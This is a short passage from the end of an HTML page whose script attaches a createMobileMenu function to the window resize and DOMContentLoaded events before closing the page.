        }

        window.addEventListener('resize', createMobileMenu);
        document.addEventListener('DOMContentLoaded', createMobileMenu);
    </script>
</body>
</html>


